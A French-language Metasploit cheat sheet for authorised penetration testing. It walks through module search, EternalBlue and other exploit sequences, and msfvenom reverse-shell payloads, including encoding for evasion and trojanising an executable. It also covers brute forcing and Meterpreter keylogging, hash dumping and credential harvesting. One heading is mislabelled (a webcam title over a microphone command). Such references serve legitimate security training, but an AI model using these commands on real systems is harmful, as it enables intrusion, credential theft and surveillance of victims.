# Metasploit Framework Cheat Sheet

## Overview

Metasploit Framework est une plateforme de test d'intrusion open-source utilisée pour :

- Découvrir des services.
- Valider des vulnérabilités.
- Développer et tester des exploits.
- Effectuer des activités post-exploitation.
- Réaliser des évaluations de sécurité autorisées.

Metasploit fournit :

- Une grande base de données d'exploits.
- Des générateurs de payloads.
- Des modules post-exploitation.
- Des modules auxiliaires pour le scanning et l'énumération.
- L'intégration avec d'autres outils.

```text
Utilisez Metasploit uniquement contre des systèmes que vous possédez ou pour lesquels vous avez une autorisation explicite de test.
```

---

# 1. Starting Metasploit

## Démarrer la console Metasploit

```bash
msfconsole
```

Cela lance l'interface en ligne de commande interactive de Metasploit.

## Démarrer Metasploit et se connecter à une base de données existante

```bash
msfconsole
```

Metasploit se connecte automatiquement à la base de données PostgreSQL si elle est en cours d'exécution.

## Vérifier le statut de la base de données

Depuis `msfconsole` :

```bash
db_status
```

## Démarrer le service de base de données (s'il n'est pas en cours d'exécution)

Sur de nombreux systèmes :

```bash
sudo systemctl start postgresql
sudo msfdb init
```

Puis redémarrez `msfconsole`.

## Afficher l'aide

```bash
help
```

## Quitter Metasploit

```bash
exit
```

ou

```bash
quit
```

---

# 2. Workspace Management

Les workspaces vous aident à organiser plusieurs engagements.

## Lister les workspaces

```bash
workspace
```

## Créer un nouveau workspace

```bash
workspace -a engagement_name
```

## Basculer vers un workspace

```bash
workspace engagement_name
```

## Supprimer un workspace

```bash
workspace -d engagement_name
```

## Renommer un workspace

```bash
workspace -r old_name new_name
```

## Afficher le workspace actuel

```bash
workspace
```

---

# 3. Searching for Modules

Les modules Metasploit sont organisés en catégories :

- `exploit`
- `payload`
- `auxiliary`
- `post`
- `encoder`
- `evasion`
- `nops`

## Rechercher par mot-clé

```bash
search keyword
```

Exemple :

```bash
search smb
```

## Rechercher par type de module

```bash
search type:exploit smb
```

## Rechercher par plateforme

```bash
search platform:windows
```

## Rechercher par CVE

```bash
search cve:2017-0144
```

## Rechercher par port

```bash
search port:445
```

## Rechercher par rank

Les ranks indiquent la fiabilité et la sécurité :

- `manual`
- `low`
- `normal`
- `good`
- `great`
- `excellent`

```bash
search rank:excellent
```

## Combiner les filtres de recherche

```bash
search type:exploit platform:windows port:445 rank:great
```

## Afficher des informations détaillées sur un module

```bash
info exploit/windows/smb/ms17_010_eternalblue
```

---

# 4. Using Modules

## Sélectionner un module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## Afficher les options du module

```bash
show options
```

## Afficher les options avancées

```bash
show advanced
```

## Afficher les options d'évasion

```bash
show evasion
```

## Définir une option

```bash
set RHOSTS <target-IP>
```

## Définir plusieurs cibles

```bash
set RHOSTS 192.168.1.10,192.168.1.20
```

## Définir une plage de cibles

```bash
set RHOSTS 192.168.1.10-20
```

## Définir un sous-réseau

```bash
set RHOSTS 192.168.1.0/24
```

## Définir l'interface locale

```bash
set LHOST 192.168.1.5
```

## Définir le port d'écoute

```bash
set LPORT 4444
```

## Définir un payload pour l'exploit actuel

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## Réinitialiser une option à sa valeur par défaut

```bash
unset RHOSTS
```

## Réinitialiser toutes les options

```bash
unset *
```

## Exécuter le module

```bash
run
```

ou pour les exploits :

```bash
exploit
```

## Exécuter le module en arrière-plan

```bash
run -j
```

ou

```bash
exploit -j
```

## Afficher les sessions

```bash
sessions
```

## Interagir avec une session

```bash
sessions -i 1
```

## Tuer une session

```bash
sessions -k 1
```

## Tuer toutes les sessions

```bash
sessions -K
```

---

# 5. Payloads

## Lister les payloads disponibles

```bash
show payloads
```

## Générer un payload avec msfvenom

En dehors de `msfconsole` :

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

## Générer un payload Linux

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
```

## Générer un payload PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.php
```

## Générer un payload Python

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.py
```

## Générer un payload PowerShell

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f powershell -o payload.ps1
```

## Générer un shellcode en hex

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f c
```

## Encoder un payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

## Lister les encodeurs

```bash
msfvenom --list encoders
```

## Lister les formats disponibles

```bash
msfvenom --list formats
```

## Générer un payload staged vs stageless

Staged (payload initial plus petit, télécharge des stages supplémentaires) :

```bash
windows/meterpreter/reverse_tcp
```

Stageless (plus grand, autonome) :

```bash
windows/meterpreter_reverse_tcp
```

---

# 6. Auxiliary Modules

Les modules auxiliaires sont utilisés pour le scanning, l'énumération, le fuzzing et d'autres tâches non liées à l'exploitation.

## Rechercher des modules auxiliaires

```bash
search type:auxiliary smb
```

## Utiliser un scanner auxiliaire

```bash
use auxiliary/scanner/smb/smb_version
```

## Définir la cible

```bash
set RHOSTS <target-IP>
```

## Exécuter le scanner

```bash
run
```

## Scanners auxiliaires courants

### Détection de version SMB

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS <target-IP>
run
```

### Énumération des partages SMB

```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <target-IP>
run
```

### Énumération SSH

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <target-IP>
run
```

### Scanner de répertoires HTTP

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target-IP>
run
```

### Détection de version HTTP

```bash
use auxiliary/scanner/http/http_version
set RHOSTS <target-IP>
run
```

### Scanner de ports (TCP)

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <target-IP>
run
```

### Vérification de connexion anonyme FTP

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target-IP>
run
```

### Énumération de connexion MySQL

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target-IP>
run
```

### Détection RDP

```bash
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <target-IP>
run
```

---

# 7. Exploitation Workflow

## Étape 1 : Rechercher un exploit

```bash
search ms17-010
```

## Étape 2 : Sélectionner l'exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## Étape 3 : Afficher les options

```bash
show options
```

## Étape 4 : Définir la cible

```bash
set RHOSTS <target-IP>
```

## Étape 5 : Définir le payload

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## Étape 6 : Définir l'IP et le port local

```bash
set LHOST 192.168.1.5
set LPORT 4444
```

## Étape 7 : Vérifier si la cible est vulnérable (si supporté)

```bash
check
```

Tous les modules ne supportent pas la commande `check`.

## Étape 8 : Exécuter l'exploit

```bash
exploit
```

## Étape 9 : Interagir avec la session

```bash
sessions -i 1
```

---

# 8. Post-Exploitation with Meterpreter

Une fois que vous avez une session Meterpreter :

## Afficher l'aide

```bash
help
```

## Afficher les informations système

```bash
sysinfo
```

## Afficher l'utilisateur actuel

```bash
getuid
```

## Afficher les processus

```bash
ps
```

## Migrer vers un autre processus

```bash
migrate <pid>
```

## Upload un fichier

```bash
upload local_path remote_path
```

## Download un fichier

```bash
download remote_path local_path
```

## Prendre une capture d'écran

```bash
screenshot
```

## Enregistrer la webcam

```bash
record_mic
```

## Keylogging

```bash
keyscan_start
keyscan_dump
keyscan_stop
```

## Hashdump (nécessite des privilèges)

```bash
run post/windows/gather/hashdump
```

## Énumérer les utilisateurs locaux

```bash
run post/windows/gather/enum_users
```

## Énumérer les applications installées

```bash
run post/windows/gather/enum_applications
```

## Énumérer les données Chrome

```bash
run post/windows/gather/enum_chrome
```

## Rechercher des fichiers

```bash
search -f *.txt
```

## Rechercher des fichiers spécifiques

```bash
search -f password
```

## Exécuter une commande

```bash
shell
```

Revenir à Meterpreter :

```bash
exit
```

## Exécuter une seule commande

```bash
execute -f cmd.exe -i
```

## Migrer la session vers un processus plus stable

```bash
migrate <pid>
```

## Mettre la session en arrière-plan

Appuyez sur `Ctrl+Z` et confirmez avec `y`.

## Lister toutes les sessions

```bash
sessions
```

## Interagir avec une session spécifique

```bash
sessions -i <id>
```

## Tuer une session

```bash
sessions -k <id>
```

---

# 9. Pivoting and Port Forwarding

## Ajouter une route via un hôte compromis

Depuis `msfconsole` :

```bash
route add 10.10.10.0/24 1
```

Où `1` est l'ID de session.

## Afficher les routes

```bash
route print
```

## Supprimer une route

```bash
route delete 10.10.10.0/24
```

## Utiliser une route avec un module

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.20
set SESSION 1
run
```

## Port forwarding

Rediriger un port distant vers votre machine locale :

```bash
portfwd add -l 8080 -p 80 -r 10.10.10.20 -s 1
```

Cela redirige :

- Port local `8080`
- Vers le port distant `80` sur `10.10.10.20`
- Via la session `1`

Accès via :

```text
http://127.0.0.1:8080
```

## Supprimer le port forwarding

```bash
portfwd delete -l 8080
```

---

# 10. Database Integration

## Afficher tous les hôtes

```bash
hosts
```

## Afficher tous les services

```bash
services
```

## Afficher les services pour un hôte spécifique

```bash
services -H <target-IP>
```

## Afficher les services vulnérables

```bash
services -p 445
```

## Importer les résultats Nmap

```bash
db_import scan.xml
```

Les formats supportés incluent :

- Nmap XML.
- Nessus.
- Burp.
- Autres.

## Exporter les données de la base de données

```bash
db_export /path/to/export
```

## Effacer la base de données

```bash
db_removeall
```

À utiliser avec précaution.

---

# 11. Resource Scripts and Automation

## Exécuter un script resource

```bash
resource /path/to/script.rc
```

## Créer un script resource simple

Exemple `auto_exploit.rc` :

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit -j
```

L'exécuter :

```bash
resource auto_exploit.rc
```

## Logger toutes les commandes et sorties

```bash
spool /path/to/logfile.txt
```

Arrêter le logging :

```bash
spool off
```

---

# 12. Encoding and Evasion

## Lister les encodeurs disponibles

```bash
msfvenom --list encoders
```

## Encoder un payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

## Générer un payload avec plusieurs encodages

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o multi_encoded.exe
```

## Utiliser des templates personnalisés

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x original.exe -f exe -o trojan.exe
```

Cela intègre le payload dans un exécutable existant.

## Lister les formats disponibles

```bash
msfvenom --list formats
```

---

# 13. Common Exploits and Scenarios

## SMB EternalBlue (MS17-010)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

## MS08-067 (NetAPI)

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <target-IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

## Apache Struts RCE

```bash
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS <target-IP>
set RPORT 8080
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

## SSH Brute Force

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-IP>
set USERNAME root
set PASS_FILE /path/to/passwords.txt
run
```

## FTP Brute Force

```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target-IP>
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
run
```

## HTTP Directory Bruteforce

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target-IP>
run
```

## VNC Scanner

```bash
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <target-IP>
run
```

---

# 14. Meterpreter Post Modules

## Migrer vers un processus stable

```bash
migrate <pid>
```

## Obtenir les informations système

```bash
sysinfo
```

## Obtenir l'ID utilisateur

```bash
getuid
```

## Vérifier si l'exécution se fait dans une VM

```bash
run post/windows/gather/enum_vmware
```

## Énumérer les utilisateurs locaux

```bash
run post/windows/gather/enum_users
```

## Énumérer les logiciels installés

```bash
run post/windows/gather/enum_applications
```

## Dump les hashes

```bash
run post/windows/gather/hashdump
```

## Énumérer Chrome

```bash
run post/windows/gather/enum_chrome
```

## Énumérer Firefox

```bash
run post/windows/gather/enum_firefox
```

## Rechercher des fichiers intéressants

```bash
search -f *.docx
search -f *.pdf
search -f password
```

## Upload un fichier

```bash
upload /local/path/file.txt C:\\temp\\file.txt
```

## Download un fichier

```bash
download C:\\temp\\file.txt /local/path/
```

## Exécuter une commande

```bash
shell
```

Revenir à Meterpreter :

```bash
exit
```

## Exécuter une seule commande

```bash
execute -f cmd.exe -i
```

## Tuer un processus

```bash
kill <pid>
```

## Redémarrer le système

```bash
reboot
```

## Arrêter le système

```bash
shutdown
```

---

# 15. Practical Workflows

## Flux de travail d'exploitation de base

```text
1. Rechercher un exploit.
2. Sélectionner l'exploit.
3. Afficher les options.
4. Définir RHOSTS, LHOST, LPORT.
5. Définir le payload.
6. Exécuter check (si disponible).
7. Exploiter.
8. Interagir avec la session.
9. Effectuer la post-exploitation.
10. Documenter les résultats.
```

## Exemple : Flux de travail complet

```bash
# Démarrer Metasploit
msfconsole

# Rechercher
search ms17-010

# Utiliser l'exploit
use exploit/windows/smb/ms17_010_eternalblue

# Définir les options
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444

# Check
check

# Exploiter
exploit

# Interagir
sessions -i 1

# Post-exploitation
sysinfo
getuid
run post/windows/gather/hashdump
```

## Énumération d'application web

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target-IP>
run

use auxiliary/scanner/http/http_version
set RHOSTS <target-IP>
run

use auxiliary/scanner/http/title
set RHOSTS <target-IP>
run
```

## Énumération réseau

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.0/24
run
```

---

# 16. Common Commands Reference

| Command | Description |
|---|---|
| `msfconsole` | Démarrer la console Metasploit |
| `workspace` | Gérer les workspaces |
| `search` | Rechercher des modules |
| `use` | Sélectionner un module |
| `show options` | Afficher les options du module |
| `set` | Définir une option |
| `unset` | Réinitialiser une option |
| `run` / `exploit` | Exécuter un module |
| `check` | Tester si une cible est vulnérable |
| `sessions` | Lister les sessions |
| `sessions -i` | Interagir avec une session |
| `background` | Mettre la session actuelle en arrière-plan |
| `exit` / `quit` | Quitter Metasploit |
| `spool` | Logger les commandes et sorties |
| `resource` | Exécuter un script resource |
| `db_import` | Importer les résultats de scan |
| `hosts` | Lister les hôtes dans la base de données |
| `services` | Lister les services dans la base de données |
| `route` | Gérer le routage via des hôtes compromis |
| `portfwd` | Configurer le port forwarding |
| `msfvenom` | Générer des payloads |
| `help` | Afficher l'aide |

---

# 17. Important Reminders

- Obtenez toujours une autorisation explicite avant d'utiliser Metasploit.
- Testez les exploits d'abord dans un environnement de laboratoire contrôlé.
- Tous les exploits ne sont pas fiables ; vérifiez le rank.
- Certains modules peuvent faire planter des services ou des systèmes.
- Maintenez Metasploit à jour régulièrement.
- Validez les résultats manuellement ; ne vous fiez pas uniquement aux résultats automatisés.
- Documentez toutes les actions, commandes et résultats.
- Préservez les preuves originales et les logs.
- Respectez le périmètre et les règles d'engagement.
- Comprenez les implications légales et éthiques de vos actions.

